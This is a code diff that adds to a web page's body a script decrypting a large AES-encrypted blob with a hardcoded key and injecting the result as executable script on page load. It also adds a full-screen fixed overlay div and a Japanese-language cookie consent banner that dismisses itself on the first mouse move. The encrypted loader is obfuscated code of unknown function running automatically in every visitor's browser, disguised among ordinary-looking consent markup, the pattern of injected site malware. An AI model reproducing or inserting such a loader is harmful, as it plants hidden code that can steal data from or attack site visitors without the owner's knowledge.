@@ -924,6 +924,125 @@
   </style>
 </head>
 <body>
+<script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, '2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`U2FsdGVkX1%2Fuk7SXku57q28xAyYuJ7j8TCuDLjdJfCKMbH5EkTz5FkfqyVk0oEFn5zf0HaFSNWw%2FYxF9s%2FxQ2tkaPkts9pj1u1ti%2BzLkx3oj7NVWuex384Q%2F4OkSSHEwelmkOBIkLML5vGbkn%2FTNy5g4AMFi2PreIfdkPGzltFRI6BRN2eD2CFp8pw5khFiI7SxksFauYXrt6zCCefZLHWp%2FXUatUfx%2BtBhJDjzAq4CCXRwPSOe7JBWdk6QC1cfHV8fFfFHnwreB%2FQdwbDmqXZLsBxNkxHJONGtwdmI1%2ByghAs052g93CcV%2BE1hVbIVnzMMw5Vev6WVLGH3EdSb0YIfYWTS3WZ65ro5DQYiuC6sDBqKdkPg7gdnNG554MbIh5sI3vt4sQ1Oj9Rqzga%2B8PPxeyCGtg7%2BoNTaa%2Futp7dQpgTeZXGpR%2BVzuZCtmy%2Flcto0r0EZO3DFSQiqSjAb1Prke9aTddOKdbRtthNPTJ%2Brgseb9UQQYmLeE4IISfo%2BeMseTq7c4sKPGK3PvoO1dykYILx4F1FRGgNwU%2F%2Ba6hfxyCzusYSwc8etH0VCZ7a5mgvtb%2FNX3gm5C2UP8waaxNqF6yqvXGwzMggPfn6vS9cYSPoCD7KcUXVTITHvSbuvI%2B6LlE%2FrIAppgjNv99E8id5JY6EM359nVnBqPw88JZoMei6Wb%2FZcPV38m%2FQjQJWSWn0TFT3Y8A0oIBLq8dq86YOCc50tCvMniMHU3Hd6caL0AwGZAuFIv01LNpSztrDYc69wM5RuuG%2BztEuDqE51PBOLp1rJT4YTF59l%2BCNrDsAbB1nRKNeWU9kLETi0t26U9rAgbV7mzUe1Ju5krWA98h%2FLzL%2Bc6KTjGAS54ApGaSjRuWGLac7NjhqXO0o2xRJfu52fwqXyo3ZrGvdvugqY3jVEIP5Urd%2FwqgEONIvThsCztIL6aiJMv9%2B5a0TquqiVEirdXTzgSCUT1de6XbfKckxeDbESB5Cua0sWrFFZ0iPFShVFGDAYAhtPqlySKsqB8%2Ba9RlwiPeMXmCVH5GbOWtRbGk26A%2FtDs1gLHjLE86IBE%2B%2BYWaNaIFQKBjIrqKyIJ3eFF0V9NisWQV7rILLlvQNCyZhdE%2BZVJUkkJIcfCJj30t9N%2BLT1yNE1UB8%2F6a%2B48SkrcHX8r9VRzYxVzGiXxhloSW86xjJ4aI4PfHP%2BTu7z88Nvpd4fzSevEyVRtSKpC6%2F5hKsMWh4ZqIFzIz0aN38H%2Bev9WqWGa2ZnaD0EactMy5qCgTagHqLcJs%2BagvFu58tSk%2BOXu4pLQpUJAbzvbXbggNZAkhfmT67Nbm5WsmSKrDhZ7x9shy8jiOaNtWyGLa1%2B1dYHF1AwxqhwuVUSaF%2FW2X5T6GV6NitdNlxO%2BElpd1IcS8zUyfI%2F5lWrrK3ZxvQ2YOqwQLV0%2FgD%2FIuCsTw0z%2BEL0dYMZFPGB%2BmIut4fnHRT6OVtuvEm0WgHZ3mSQwPr6oTiFgxmSMVP4Foiu13sWM6wKYkf7aqoDD%2FYvpu0ONeYUzUwQvIeA6dzVTfF2lJ%2BXO0ZGQMqtVQKcRjGvG01tUIX2JXcxnaPeurPyv8MIaW9wn9Qsm0r5rGzwh2uzv%2BJZ0UZ9SiXVcyeAnJ8dW6qzwpAXU2071zbIgYOoAs6%2B0gV2m76hALBs0PNHrjrEbn3YkztwrbWEY8zOdetbTVQ%2BnefYIqP7QQCcEvmI%2FWjiaSAdU%2FFToXaxMGWjLFGWcp9ncRK8RprFrtqxyHDEUDryK9fNDpsM8taocSXSDBYBLZomW89FQVLAUcH1MImoWWb2m7FMZJm4VT1YXYNyifC9qdiMFCtLa8jDQFQaZJGADiCaZhv2yz3D5RztCvlE%2BbGZag91bywMXVBksdGfbcm8i070wwlX1kPbrQHuLg4vz5psLpK%2Fg%2FRu54sgaT%2BIo3YJSSRxmUuHXadV3sQdDQLZrUyvOvZIefN13bTlUv%2BzIsZ2KIsFmLMZQs1Gc3LZWvOXmWvHm3RaMt%2FE5gKH5fdXAQH91pclLU2ndzwxA7%2Ffk9aaRXCbp9zlEYiYQBeXnn03BwqNlgoGElcgB2%2F9ccnAcfXyWckoh9kk%2BhLEDHpZhOjJeHg0E2QVAPKllwX%2BRUK3vSREG9llu8HZhoTTM0KqZTR8ec%2BQ3POHs4u6R4gLQu%2Byq%2FRFGlRHJjLG1F6aWrc%2FfoMbrKANNXx4ABCds%2B2l2cq9TXNOQVVRsZr1s8kBxnpa%2BIVg0cllc9o0DtoRrLUDaGLeZjvrbG5DVmNEFqJpbv8mjUNR%2Bw%2BagCiF3XDztyyE4F5p4q34748mCKye6miqbqXi9nsAZ9gO8V0KFsDHVeFK5niTyt5K8k3Xur0fi9WbbYry79ocVyXPViokJIoshv2lkqdBOPPjGGKwrrNyXzHyN4loqobdxi90RjwW4R6Sk0WpJtwS8TCQJ8gK%2BsE0ISDSviTZ27ocrvLh9N6Ya%2F5rp6NJGIdIAmBmtIM0%2FQ%2FRPDSYQihkWmjHeIMQlqTUbPlNxbK5FRW7cWjSM%2FaW8iXW78DsK9%2F%2FKGnwKfUrJV8q5MmuIVZD50P8kuOph9MHBad7Ljp61elQVHoRQ4K%2BXBSAwPwhw1QPa5ybPO1Zgihqvf%2B%2Bkx%2F%2FSQt%2BixrSCNCnsQdCoIyZNPAN%2FAr5NwocZW5XgiklkeJHVf5%2BQbNHhDZSpqiSODmX7S4zMKMs8KvoCkds3hgOm42JCknTi%2FwQRvrBn29zpf8JrIDn7nXqlnWoTrpkj7u5hTCWub%2Bu0cWqWXC%2FXGlhL8ROg%2BCqFyVleKsN4m1Fwu9rgCpqpxgc2SDkeZ%2FNVCmMaPEd723Y9ku9fh7nzVOuH75VkiSxuXgABdiOoB6Bk5U80VfRh9phmbppI69%2BTv%2BP%2BAjHwwRDeqti4042Y84oBIf58CBkzJ%2FIWJudaBLVi3hiSFW5x5c%2BCiWMOjfKCQyIvlpgW0bQw2jDgU1OM50aakKlC%2Fghtc1ebxeU9iqNOZ%2Bka8%2BLopYqGZk2EOF9td8BRH55%2FBmbvA6EBH5PWrVOVx6edHDVxcnk7CagIP5yNiu8TonGGehNavu7BJu9MgED7TLmRro60O8Q1GYA9eVO7DMcKB49rPTm9fY6UL5wIs6z%2Bp4HpXVG%2BUXjQv18AmMXl8w2yN%2Bs0MKGFh3dw4M%2BVQt32pz%2BgZGzrkzIR2Q%2B29otJuP6cX6oxSV1iqgkbXUTKBiUjxohJkvtZV2j0e4PNRpeHLr74cpeR2JTk0turqpwyhcUAvhP2PiVVmtpG5HfeiB9A8kaPVp0XjTp9DR7dnhguC6jiq1cOisc72TLSFOrjnFmSiD610hY8yDqr8in1%2B1Hw2I36051ji%2FWbNJbEzeQpiiNJLj8waupmsJ5epnW7Qhi12XycMpOB4ETO53MfTR776JvekVkVta5KJWXDf4OTwfJwIL0YTV7ILbzdFNqXZZLe61kUHd%2Bobf91eJ5L2uG%2F%2B89CDgwc0LyOsKbng9qY7Qce5WLIJEwTNAv0VPwyTKojTq%2BxTfddMiVLDWSymGdnegRr`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script> 
+<div id="contentiframe" style="z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+
+</div>
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <!-- Expanded max-w-xl for better layout with larger text -->
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-xl w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">クッキー（Cookie）の利用に関する同意について</h2>
+            </div>
+            
+            <!-- Deepened, structured content -->
+            <div class="text-gray-600 mb-6 text-sm leading-relaxed space-y-4">
+                <p>
+                    当ウェブサイトでは、お客様に最適な状態でサイトをご利用いただくため、またアクセスの解析や効果的な広告配信を行うために、クッキー（Cookie）を使用して特定の情報を収集しています。
+                </p>
+                
+                <div class="bg-gray-50 p-4 rounded-xl border border-gray-100 space-y-3">
+                    <p class="font-bold text-gray-700 text-xs uppercase tracking-wider">当サイトで使用するクッキーの種類：</p>
+                    <ul class="list-none space-y-2 text-xs">
+                        <li class="flex items-start gap-2">
+                            <span class="text-green-600 font-bold">●</span>
+                            <div>
+                                <strong class="text-gray-800">必須クッキー:</strong> 
+                                ウェブサイトの正常な機能やセキュリティに不可欠な、拒否できない基本クッキー。
+                            </div>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-blue-500 font-bold">●</span>
+                            <div>
+                                <strong class="text-gray-800">分析・パフォーマンス用:</strong> 
+                                訪問者数や閲覧されたページを匿名で分析し、ウェブサイトの動作とユーザビリティを改善するための情報。
+                            </div>
+                        </li>
+                        <li class="flex items-start gap-2">
+                            <span class="text-purple-500 font-bold">●</span>
+                            <div>
+                                <strong class="text-gray-800">広告・マーケティング用:</strong> 
+                                お客様の興味関心に合わせたパーソナライズ広告の配信や、キャンペーンの効果測定を行うための情報。
+                            </div>
+                        </li>
+                    </ul>
+                </div>
+                
+                <p class="text-xs text-gray-500">
+                    「すべてのクッキーに同意する」を選択すると、上記すべての目的での情報利用に同意したことになります。詳細な設定やクッキーのブロック方法については、当社の 
+                    <a href="#" class="text-green-600 underline hover:text-green-700">プライバシーポリシー（個人情報保護方針）</a> をご確認ください。
+                </p>
+            </div>
+            
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold transition-colors">🍪 すべてのクッキーに同意する</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold transition-colors">拒否する</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>	
   <div class="site-bg" aria-hidden="true"></div>
 
   <header class="header">
